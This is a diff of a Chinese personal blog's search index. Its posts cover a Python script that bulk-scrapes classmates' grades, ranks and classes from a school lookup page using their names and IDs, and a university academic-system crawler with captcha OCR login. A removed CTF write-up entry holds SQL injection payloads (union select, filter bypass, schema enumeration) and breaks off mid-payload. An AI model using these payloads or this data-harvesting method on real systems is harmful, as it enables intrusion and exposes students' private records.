<span class="string">&#x27;Upgrade-Insecure-Requests&#x27;</span>: <span class="string">&#x27;1&#x27;</span></span><br><span class="line">    &#125;</span><br><span class="line">    data = &#123;</span><br><span class="line">        <span class="string">&#x27;time&#x27;</span>:<span class="string">&#x27;&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;vale0&#x27;</span>:<span class="string">&#x27;0&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;uale0&#x27;</span>:<span class="string">&#x27;学号&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;sfzh0&#x27;</span>:<span class="string">f&#x27;<span class="subst">&#123;<span class="built_in">id</span>&#125;</span>&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;vale1&#x27;</span>:<span class="string">&#x27;1&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;uale1&#x27;</span>:<span class="string">&#x27;姓名&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;sfzh1&#x27;</span>:<span class="string">f&#x27;<span class="subst">&#123;name&#125;</span>&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;iiii&#x27;</span>:<span class="string">&#x27;2&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;tips&#x27;</span>:<span class="string">&#x27;&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;tits&#x27;</span>:<span class="string">&#x27;&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;button&#x27;</span>:<span class="string">&#x27;立即查询&#x27;</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    res = requests.post(url=url, headers=headers, data=data)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        soup = BeautifulSoup(res.text, <span class="string">&#x27;lxml&#x27;</span>)</span><br><span class="line"></span><br><span class="line">        _count = soup.select(<span class="string">&#x27;td[data-label=&quot;门数&quot;]&#x27;</span>)[<span class="number">0</span>].text</span><br><span class="line">        _scores = soup.select(<span class="string">&#x27;td[data-label=&quot;学分加权平均分&quot;]&#x27;</span>)[<span class="number">0</span>].text</span><br><span class="line">        _rank = soup.select(<span class="string">&#x27;td[data-label=&quot;学分加权平均分排名&quot;]&#x27;</span>)[<span class="number">0</span>].text</span><br><span class="line">        _major = soup.select(<span class="string">&#x27;td[data-label=&quot;专业&quot;]&#x27;</span>)[<span class="number">0</span>].text</span><br><span class="line">        _class = soup.select(<span class="string">&#x27;td[data-label=&quot;班级&quot;]&#x27;</span>)[<span class="number">0</span>].text</span><br><span class="line">        tmp = &#123;<span class="string">&#x27;1&#x27;</span>: name, <span class="string">&#x27;2&#x27;</span>: <span class="built_in">id</span>, <span class="string">&#x27;3&#x27;</span>: _count, <span class="string">&#x27;4&#x27;</span>: _scores, <span class="string">&#x27;5&#x27;</span>: _rank, <span class="string">&#x27;6&#x27;</span>: _major, <span class="string">&#x27;7&#x27;</span>: _class&#125;</span><br><span class="line">        stu.append(tmp)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">xw_toExcel</span>(<span class="params">data, fileName</span>):</span>  </span><br><span class="line">    workbook = xw.Workbook(fileName)  </span><br><span class="line">    worksheet1 = workbook.add_worksheet(<span class="string">&quot;sheet1&quot;</span>) </span><br><span class="line">    worksheet1.activate()  </span><br><span class="line">    title = [<span class="string">&#x27;姓名&#x27;</span>, <span class="string">&#x27;学号&#x27;</span>, <span class="string">&#x27;门数&#x27;</span>, <span class="string">&#x27;学分加权平均分&#x27;</span>, <span class="string">&#x27;学分加权平均分排名&#x27;</span>, <span class="string">&#x27;专业&#x27;</span>, <span class="string">&#x27;班级&#x27;</span>]</span><br><span class="line">    worksheet1.write_row(<span class="string">&#x27;A1&#x27;</span>, title) </span><br><span class="line">    i = <span class="number">2</span>  </span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(data)):</span><br><span class="line">        insertData = [data[j][<span class="string">&quot;1&quot;</span>], data[j][<span class="string">&quot;2&quot;</span>], data[j][<span class="string">&quot;3&quot;</span>], data[j][<span class="string">&quot;4&quot;</span>], data[j][<span class="string">&quot;5&quot;</span>], data[j][<span class="string">&quot;6&quot;</span>], data[j][<span class="string">&quot;7&quot;</span>]]</span><br><span class="line">        row = <span class="string">&#x27;A&#x27;</span> + <span class="built_in">str</span>(i)</span><br><span class="line">        worksheet1.write_row(row, insertData)</span><br><span class="line">        i += <span class="number">1</span></span><br><span class="line">    workbook.close() </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">excel_path = <span class="string">&#x27;./stu.xlsx&#x27;</span></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">excel = xlrd.open_workbook(excel_path,encoding_override=<span class="string">&quot;utf-8&quot;</span>)</span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">sheet = excel.sheets()[<span class="number">0</span>]</span><br><span class="line"> </span><br><span class="line">sheet_row_mount = sheet.nrows</span><br><span class="line">sheet_col_mount = sheet.ncols</span><br><span class="line"></span><br><span class="line">name = sheet.col_values(<span class="number">2</span>) </span><br><span class="line"><span class="built_in">id</span> = sheet.col_values(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>():</span><br><span class="line">    getScores(name[i], <span class="built_in">id</span>[i])</span><br><span class="line"></span><br><span class="line">fileName = <span class="string">&#x27;scores.xlsx&#x27;</span></span><br><span class="line">xw_toExcel(stu, fileName)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h2 id="思考"><a href="#思考" class="headerlink" title="思考"></a>思考</h2><p>python只是用来娱乐，生产力还得是c++!</p>
+]]></content>
+      <categories>
+        <category>python实践</category>
+      </categories>
+      <tags>
+        <tag>python</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>vm+kali+docker实现web题复现</title>
     <url>/posts/c52439ad/</url>
     <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>github上有很多web题的源码，可以直接下载搭建用于赛后复现，但vps搭建比较繁琐，分配域名，分配目录，分配端口且非常不安全，虚拟机本地搭建就比较简单，而且可以直接通过宿主机访问，如果源码有docker compose的话会更加简单，一键即可搭建。</p>
@@ -1575,30 +1634,45 @@ e.g. http://192.168.xxx.xxx:100/ezyii/
         <category>开发工具</category>
       </categories>
       <tags>
-        <tag>ctf</tag>
         <tag>web</tag>
+        <tag>ctf</tag>
       </tags>
   </entry>
   <entry>
-    <title>一次爬虫实战</title>
-    <url>/posts/5a85636c/</url>
-    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>最近迷上了python，各种花里胡哨的库也太好玩了。</p>
-<p>今天导员发了个查成绩的通知，外加了链接，一个很简单的网页，输入学号姓名就能查，闲来无事就把所有人的全爬下来了，外加做了一波分析（狗头）</p>
-<h2 id="实现"><a href="#实现" class="headerlink" title="实现"></a>实现</h2><p>很简单的一个网页</p>
-<p><img src="https://my-photos-test.oss-cn-hangzhou.aliyuncs.com/2021/20210923231120.png"></p>
-<p>先抓包分析，发现post的有用的就真的只有个学号姓名，连个前端加密都没有，直接构造就行。</p>
-<p>现学了execel文件读写，用菜的扣脚的beautifulsoup把网页信息提取出来了，很简单。</p>
-<p>而且网站连个反爬都没有，直接请求了好几百次都没限制，无语。</p>
-<p><strong>代码如下，已去除关键信息，仅供学习！</strong></p>
-<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> xlrd</span><br><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br><span class="line"><span class="keyword">import</span> xlsxwriter <span class="keyword">as</span> xw</span><br><span class="line"></span><br><span class="line">stu = []</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getScores</span>(<span class="params">name,<span class="built_in">id</span></span>):</span></span><br><span class="line">    url = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    headers = &#123;</span><br><span class="line">        <span class="string">&#x27;Host&#x27;</span>: <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:92.0) Gecko/20100101 Firefox/92.0&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Accept&#x27;</span>: <span class="string">&#x27;text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Accept-Language&#x27;</span>: <span class="string">&#x27;zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Accept-Encoding&#x27;</span>: <span class="string">&#x27;gzip, deflate&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Content-Type&#x27;</span>: <span class="string">&#x27;application/x-www-form-urlencoded&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Content-Length&#x27;</span>: <span class="string">&#x27;187&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Origin&#x27;</span>: <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Connection&#x27;</span>: <span class="string">&#x27;close&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Referer&#x27;</span>: <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Cookie&#x27;</span>: <span class="string">r&quot;&quot;</span>,</span><br><span class="line">        <span class="string">&#x27;Upgrade-Insecure-Requests&#x27;</span>: <span class="string">&#x27;1&#x27;</span></span><br><span class="line">    &#125;</span><br><span class="line">    data = &#123;</span><br><span class="line">        <span class="string">&#x27;time&#x27;</span>:<span class="string">&#x27;&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;vale0&#x27;</span>:<span class="string">&#x27;0&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;uale0&#x27;</span>:<span class="string">&#x27;学号&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;sfzh0&#x27;</span>:<span class="string">f&#x27;<span class="subst">&#123;<span class="built_in">id</span>&#125;</span>&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;vale1&#x27;</span>:<span class="string">&#x27;1&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;uale1&#x27;</span>:<span class="string">&#x27;姓名&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;sfzh1&#x27;</span>:<span class="string">f&#x27;<span class="subst">&#123;name&#125;</span>&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;iiii&#x27;</span>:<span class="string">&#x27;2&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;tips&#x27;</span>:<span class="string">&#x27;&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;tits&#x27;</span>:<span class="string">&#x27;&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;button&#x27;</span>:<span class="string">&#x27;立即查询&#x27;</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    res = requests.post(url=url, headers=headers, data=data)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        soup = BeautifulSoup(res.text, <span class="string">&#x27;lxml&#x27;</span>)</span><br><span class="line"></span><br><span class="line">        _count = soup.select(<span class="string">&#x27;td[data-label=&quot;门数&quot;]&#x27;</span>)[<span class="number">0</span>].text</span><br><span class="line">        _scores = soup.select(<span class="string">&#x27;td[data-label=&quot;学分加权平均分&quot;]&#x27;</span>)[<span class="number">0</span>].text</span><br><span class="line">        _rank = soup.select(<span class="string">&#x27;td[data-label=&quot;学分加权平均分排名&quot;]&#x27;</span>)[<span class="number">0</span>].text</span><br><span class="line">        _major = soup.select(<span class="string">&#x27;td[data-label=&quot;专业&quot;]&#x27;</span>)[<span class="number">0</span>].text</span><br><span class="line">        _class = soup.select(<span class="string">&#x27;td[data-label=&quot;班级&quot;]&#x27;</span>)[<span class="number">0</span>].text</span><br><span class="line">        tmp = &#123;<span class="string">&#x27;1&#x27;</span>: name, <span class="string">&#x27;2&#x27;</span>: <span class="built_in">id</span>, <span class="string">&#x27;3&#x27;</span>: _count, <span class="string">&#x27;4&#x27;</span>: _scores, <span class="string">&#x27;5&#x27;</span>: _rank, <span class="string">&#x27;6&#x27;</span>: _major, <span class="string">&#x27;7&#x27;</span>: _class&#125;</span><br><span class="line">        stu.append(tmp)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">xw_toExcel</span>(<span class="params">data, fileName</span>):</span>  </span><br><span class="line">    workbook = xw.Workbook(fileName)  </span><br><span class="line">    worksheet1 = workbook.add_worksheet(<span class="string">&quot;sheet1&quot;</span>) </span><br><span class="line">    worksheet1.activate()  </span><br><span class="line">    title = [<span class="string">&#x27;姓名&#x27;</span>, <span class="string">&#x27;学号&#x27;</span>, <span class="string">&#x27;门数&#x27;</span>, <span class="string">&#x27;学分加权平均分&#x27;</span>, <span class="string">&#x27;学分加权平均分排名&#x27;</span>, <span class="string">&#x27;专业&#x27;</span>, <span class="string">&#x27;班级&#x27;</span>]</span><br><span class="line">    worksheet1.write_row(<span class="string">&#x27;A1&#x27;</span>, title) </span><br><span class="line">    i = <span class="number">2</span>  </span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(data)):</span><br><span class="line">        insertData = [data[j][<span class="string">&quot;1&quot;</span>], data[j][<span class="string">&quot;2&quot;</span>], data[j][<span class="string">&quot;3&quot;</span>], data[j][<span class="string">&quot;4&quot;</span>], data[j][<span class="string">&quot;5&quot;</span>], data[j][<span class="string">&quot;6&quot;</span>], data[j][<span class="string">&quot;7&quot;</span>]]</span><br><span class="line">        row = <span class="string">&#x27;A&#x27;</span> + <span class="built_in">str</span>(i)</span><br><span class="line">        worksheet1.write_row(row, insertData)</span><br><span class="line">        i += <span class="number">1</span></span><br><span class="line">    workbook.close() </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">excel_path = <span class="string">&#x27;./stu.xlsx&#x27;</span></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">excel = xlrd.open_workbook(excel_path,encoding_override=<span class="string">&quot;utf-8&quot;</span>)</span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">sheet = excel.sheets()[<span class="number">0</span>]</span><br><span class="line"> </span><br><span class="line">sheet_row_mount = sheet.nrows</span><br><span class="line">sheet_col_mount = sheet.ncols</span><br><span class="line"></span><br><span class="line">name = sheet.col_values(<span class="number">2</span>) </span><br><span class="line"><span class="built_in">id</span> = sheet.col_values(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>():</span><br><span class="line">    getScores(name[i], <span class="built_in">id</span>[i])</span><br><span class="line"></span><br><span class="line">fileName = <span class="string">&#x27;scores.xlsx&#x27;</span></span><br><span class="line">xw_toExcel(stu, fileName)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+    <title>中国矿业大学正方教务爬虫</title>
+    <url>/posts/6f73e94e/</url>
+    <content><![CDATA[<h1 id="中国矿业大学正方教务爬虫"><a href="#中国矿业大学正方教务爬虫" class="headerlink" title="中国矿业大学正方教务爬虫"></a>中国矿业大学正方教务爬虫</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p><strong>项目地址：</strong></p>
+<p><a href="https://github.com/Haorical/CUMT-jwxt">https://github.com/Haorical/CUMT-jwxt</a></p>
+<p>配置好后直接运行main.py就可以体验爬取成绩的功能，代码可读性良好，适合二次开发。</p>
+<p>本着服务抗大学子的宗旨，写了这个教务爬虫，用来练手，应该会开发一段时间，目前只<br>实现了模拟登录和爬取成绩，万众瞩目的自动抢课功能由于当前没有开放选课，暂时无法<br>开发，暂时搁置。</p>
+<h2 id="功能"><a href="#功能" class="headerlink" title="功能"></a>功能</h2><h3 id="模拟登录"><a href="#模拟登录" class="headerlink" title="模拟登录"></a>模拟登录</h3><h4 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h4><p>一共写了两个版本，一个是使用selenium的SlowLogin，看名字就看出来了，这个登录的慢<br>而且需要配置webdriver，登录一次大约需要8-10秒钟；另一个是基于requests的<br>FastLogin，这个顾名思义就相当的快了，登录一次不到五秒钟，速度飞起，而且可能我用的<br>vpn比较卡，在校园网上应该能更快。</p>
+<p>两个版本可以自由切换,在config中设置即可，更改login即可</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">opinions:</span><br><span class="line">  - login: <span class="string">&#x27;fast&#x27;</span></span><br></pre></td></tr></table></figure>
 
-<h2 id="思考"><a href="#思考" class="headerlink" title="思考"></a>思考</h2><p>python只是用来娱乐，生产力还得是c++!</p>
+<p>两个模拟登录都可以直接返回成功登录之后的cookie，可以用来爬之后的界面，非常适合二次开发，欢迎二次开发，最好给个star :)</p>
+<h4 id="实现"><a href="#实现" class="headerlink" title="实现"></a>实现</h4><p>先说SlowLogin，比较无脑，获得输入框的xpath，然后直接sendkeys，这里有个比较麻烦<br>的就是验证码的问题，这里我用了webdriver的screenshot方法，将图片保存到本地，然后调用<br>百度的ocr，要花钱(5555)，而且存在识别错现象。因为本来就不是很智能，用人眼看填验证码的话<br>就更不智能了。</p>
+<p>FastLogin这个就非常智能，模拟了发包过程，通过分析登录操作可以知道，先get RSA的公钥再get验证码，分析前端加密js可知，是通过rsa对password进行了加密，我们可以用简单的用python模拟，考虑到搭建环境太复杂，这里是模拟的，没有用exejs和node.js，因此耗费了很长时间，其中jsFunction模拟了js中对RSA的加密。由于get的验证码是二进制文件<br>我们可以直接将其写入文件中，然后调用baiduocr的api识别，或者人工识别，两个函数在FastLogin中可以自由选择，可以通过config.yml进行设置</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 智能人工识别验证码</span></span><br><span class="line">code = get_code_by_people(sessions)</span><br><span class="line"><span class="comment"># 人工智能识别验证码</span></span><br><span class="line">code = get_code_by_ocr(sessions)</span><br></pre></td></tr></table></figure>
+<p>config如下</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">opinions:</span><br><span class="line">  - AI: true</span><br></pre></td></tr></table></figure>
+<p>调用人工识别函数的时候比较有趣，如下，会弹出窗口，然后人工识别</p>
+<p><img src="https://my-photos-test.oss-cn-hangzhou.aliyuncs.com/2021/20210916224421.png"></p>
+<p>可以看到成功获得了cookie</p>
+<p><img src="https://my-photos-test.oss-cn-hangzhou.aliyuncs.com/2021/20210916224809.png"></p>
+<p>ocr识别的话，如下</p>
+<p><img src="https://my-photos-test.oss-cn-hangzhou.aliyuncs.com/2021/20210916225044.png"></p>
+<p>可以看到，只识别了一次，如果识别错误的话，会自动重新登录，直到登录成功</p>
+<h3 id="爬取成绩"><a href="#爬取成绩" class="headerlink" title="爬取成绩"></a>爬取成绩</h3><p>分析抓包即可，页面逻辑比较简单，post后返回的是json数据，解析，保存成了字典，{科目=&gt;[平时分，期末分，总分，学分，绩点]}，因为获得平时分时需要每一科都请求一次，因此速度比较慢，其中也有一些选项，自己探索吧，懒得写了，睡觉！</p>
+<p><img src="https://my-photos-test.oss-cn-hangzhou.aliyuncs.com/2021/20210916230422.png"></p>
+<p>一些设置如下，需要保存在config.yml中</p>
+<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">user:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">id:</span> <span class="string">&#x27;xxxxxxxx&#x27;</span> <span class="string">学号</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">password:</span> <span class="string">&#x27;xxxxxxxxxx&#x27;</span> <span class="string">密码</span></span><br><span class="line"><span class="attr">ocr:</span> <span class="string">百度识图的api</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">key:</span> <span class="string">&#x27;xxxxxxxxxxx&#x27;</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">secret:</span> <span class="string">&#x27;xxxxxxxxxxxxxxxx&#x27;</span></span><br><span class="line"><span class="attr">opinions:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">AI:</span> <span class="literal">true</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">login:</span> <span class="string">&#x27;fast&#x27;</span></span><br></pre></td></tr></table></figure>
 ]]></content>
       <categories>
         <category>python实践</category>
       </categories>
       <tags>
         <tag>python</tag>
+        <tag>爬虫</tag>
       </tags>
   </entry>
   <entry>
@@ -1642,7 +1716,7 @@ e.g. http://192.168.xxx.xxx:100/ezyii/
 <h1 id="联系我"><a href="#联系我" class="headerlink" title="联系我"></a>联系我</h1><p><strong>本项目仅供学习交流使用，如作他用所承受的任何直接、间接法律责任一概与作者无关</strong><br><strong>如果此项目侵犯了您或者您公司的权益，请立即联系我删除</strong></p>
 <p>如果你有不懂的,或者需要api不会搭建的,欢迎联系我,我会看心情给你解答（狗头）</p>
 <blockquote>
-<p>邮箱： <a href="mailto:&#x69;&#x6b;&#x61;&#101;&#x6b;&#107;&#107;&#64;&#100;&#x69;&#x6e;&#103;&#116;&#97;&#108;&#x6b;&#x2e;&#99;&#x6f;&#109;">&#x69;&#x6b;&#x61;&#101;&#x6b;&#107;&#107;&#64;&#100;&#x69;&#x6e;&#103;&#116;&#97;&#108;&#x6b;&#x2e;&#99;&#x6f;&#109;</a></p>
+<p>邮箱： <a href="mailto:&#105;&#107;&#x61;&#x65;&#107;&#107;&#107;&#x40;&#100;&#105;&#x6e;&#103;&#116;&#x61;&#x6c;&#107;&#46;&#99;&#x6f;&#109;">&#105;&#107;&#x61;&#x65;&#107;&#107;&#107;&#x40;&#100;&#105;&#x6e;&#103;&#116;&#x61;&#x6c;&#107;&#46;&#99;&#x6f;&#109;</a></p>
 </blockquote>
 ]]></content>
       <categories>
@@ -1650,43 +1724,6 @@ e.g. http://192.168.xxx.xxx:100/ezyii/
       </categories>
       <tags>
         <tag>python</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>中国矿业大学正方教务爬虫</title>
-    <url>/posts/6f73e94e/</url>
-    <content><![CDATA[<h1 id="中国矿业大学正方教务爬虫"><a href="#中国矿业大学正方教务爬虫" class="headerlink" title="中国矿业大学正方教务爬虫"></a>中国矿业大学正方教务爬虫</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p><strong>项目地址：</strong></p>
-<p><a href="https://github.com/Haorical/CUMT-jwxt">https://github.com/Haorical/CUMT-jwxt</a></p>
-<p>配置好后直接运行main.py就可以体验爬取成绩的功能，代码可读性良好，适合二次开发。</p>
-<p>本着服务抗大学子的宗旨，写了这个教务爬虫，用来练手，应该会开发一段时间，目前只<br>实现了模拟登录和爬取成绩，万众瞩目的自动抢课功能由于当前没有开放选课，暂时无法<br>开发，暂时搁置。</p>
-<h2 id="功能"><a href="#功能" class="headerlink" title="功能"></a>功能</h2><h3 id="模拟登录"><a href="#模拟登录" class="headerlink" title="模拟登录"></a>模拟登录</h3><h4 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h4><p>一共写了两个版本，一个是使用selenium的SlowLogin，看名字就看出来了，这个登录的慢<br>而且需要配置webdriver，登录一次大约需要8-10秒钟；另一个是基于requests的<br>FastLogin，这个顾名思义就相当的快了，登录一次不到五秒钟，速度飞起，而且可能我用的<br>vpn比较卡，在校园网上应该能更快。</p>
-<p>两个版本可以自由切换,在config中设置即可，更改login即可</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">opinions:</span><br><span class="line">  - login: <span class="string">&#x27;fast&#x27;</span></span><br></pre></td></tr></table></figure>
-
-<p>两个模拟登录都可以直接返回成功登录之后的cookie，可以用来爬之后的界面，非常适合二次开发，欢迎二次开发，最好给个star :)</p>
-<h4 id="实现"><a href="#实现" class="headerlink" title="实现"></a>实现</h4><p>先说SlowLogin，比较无脑，获得输入框的xpath，然后直接sendkeys，这里有个比较麻烦<br>的就是验证码的问题，这里我用了webdriver的screenshot方法，将图片保存到本地，然后调用<br>百度的ocr，要花钱(5555)，而且存在识别错现象。因为本来就不是很智能，用人眼看填验证码的话<br>就更不智能了。</p>
-<p>FastLogin这个就非常智能，模拟了发包过程，通过分析登录操作可以知道，先get RSA的公钥再get验证码，分析前端加密js可知，是通过rsa对password进行了加密，我们可以用简单的用python模拟，考虑到搭建环境太复杂，这里是模拟的，没有用exejs和node.js，因此耗费了很长时间，其中jsFunction模拟了js中对RSA的加密。由于get的验证码是二进制文件<br>我们可以直接将其写入文件中，然后调用baiduocr的api识别，或者人工识别，两个函数在FastLogin中可以自由选择，可以通过config.yml进行设置</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 智能人工识别验证码</span></span><br><span class="line">code = get_code_by_people(sessions)</span><br><span class="line"><span class="comment"># 人工智能识别验证码</span></span><br><span class="line">code = get_code_by_ocr(sessions)</span><br></pre></td></tr></table></figure>
-<p>config如下</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">opinions:</span><br><span class="line">  - AI: true</span><br></pre></td></tr></table></figure>
-<p>调用人工识别函数的时候比较有趣，如下，会弹出窗口，然后人工识别</p>
-<p><img src="https://my-photos-test.oss-cn-hangzhou.aliyuncs.com/2021/20210916224421.png"></p>
-<p>可以看到成功获得了cookie</p>
-<p><img src="https://my-photos-test.oss-cn-hangzhou.aliyuncs.com/2021/20210916224809.png"></p>
-<p>ocr识别的话，如下</p>
-<p><img src="https://my-photos-test.oss-cn-hangzhou.aliyuncs.com/2021/20210916225044.png"></p>
-<p>可以看到，只识别了一次，如果识别错误的话，会自动重新登录，直到登录成功</p>
-<h3 id="爬取成绩"><a href="#爬取成绩" class="headerlink" title="爬取成绩"></a>爬取成绩</h3><p>分析抓包即可，页面逻辑比较简单，post后返回的是json数据，解析，保存成了字典，{科目=&gt;[平时分，期末分，总分，学分，绩点]}，因为获得平时分时需要每一科都请求一次，因此速度比较慢，其中也有一些选项，自己探索吧，懒得写了，睡觉！</p>
-<p><img src="https://my-photos-test.oss-cn-hangzhou.aliyuncs.com/2021/20210916230422.png"></p>
-<p>一些设置如下，需要保存在config.yml中</p>
-<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">user:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">id:</span> <span class="string">&#x27;xxxxxxxx&#x27;</span> <span class="string">学号</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">password:</span> <span class="string">&#x27;xxxxxxxxxx&#x27;</span> <span class="string">密码</span></span><br><span class="line"><span class="attr">ocr:</span> <span class="string">百度识图的api</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">key:</span> <span class="string">&#x27;xxxxxxxxxxx&#x27;</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">secret:</span> <span class="string">&#x27;xxxxxxxxxxxxxxxx&#x27;</span></span><br><span class="line"><span class="attr">opinions:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">AI:</span> <span class="literal">true</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">login:</span> <span class="string">&#x27;fast&#x27;</span></span><br></pre></td></tr></table></figure>
-]]></content>
-      <categories>
-        <category>python实践</category>
-      </categories>
-      <tags>
-        <tag>python</tag>
-        <tag>爬虫</tag>
       </tags>
   </entry>
   <entry>
@@ -1698,8 +1735,8 @@ e.g. http://192.168.xxx.xxx:100/ezyii/
         <category>ctf学习</category>
       </categories>
       <tags>
-        <tag>ctf</tag>
         <tag>web</tag>
+        <tag>ctf</tag>
       </tags>
   </entry>
   <entry>
@@ -1750,35 +1787,6 @@ e.g. http://192.168.xxx.xxx:100/ezyii/
     <title>反序列化总结</title>
     <url>/posts/1e128b6c/</url>
     <content><![CDATA[<h2 id=""><a href="#" class="headerlink" title=""></a></h2>]]></content>
-  </entry>
-  <entry>
-    <title>国庆赛部分赛题复现</title>
-    <url>/posts/bfdb9200/</url>
-    <content><![CDATA[<h2 id="web"><a href="#web" class="headerlink" title="web"></a>web</h2><h3 id="sql2"><a href="#sql2" class="headerlink" title="sql2"></a>sql2</h3><blockquote>
-<p>环境有点问题，复现一半出不来了</p>
-</blockquote>
-<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">查库名</span><br><span class="line">username<span class="operator">=</span>admin<span class="operator">&amp;</span>passwd<span class="operator">=</span><span class="number">1</span><span class="operator">%</span><span class="number">27</span><span class="keyword">union</span><span class="comment">/**/</span><span class="keyword">select</span><span class="comment">/**/</span>group_concat(db),<span class="number">2</span><span class="comment">/**/</span><span class="keyword">from</span><span class="comment">/**/</span>sys.schema_object_overview#</span><br><span class="line"></span><br><span class="line">查表名</span><br><span class="line"></span><br><span class="line">username<span class="operator">=</span>admin<span class="operator">&amp;</span>passwd<span class="operator">=</span>admin<span class="string">&#x27;/**/union/**/select/**/group_concat(table_name),2/**/from/**/sys.schema_table_statistics/**/where/**/table_schema=&#x27;</span>flagisHere<span class="string">&#x27;#</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">无列名注入</span></span><br><span class="line"><span class="string">username=admin&amp;passwd=admin&#x27;</span><span class="comment">/**/</span><span class="keyword">union</span><span class="comment">/**/</span><span class="keyword">select</span><span class="comment">/**/</span>(<span class="keyword">select</span><span class="comment">/**/</span>group_concat(a)<span class="comment">/**/</span><span class="keyword">from</span><span class="comment">/**/</span>(<span class="keyword">select</span><span 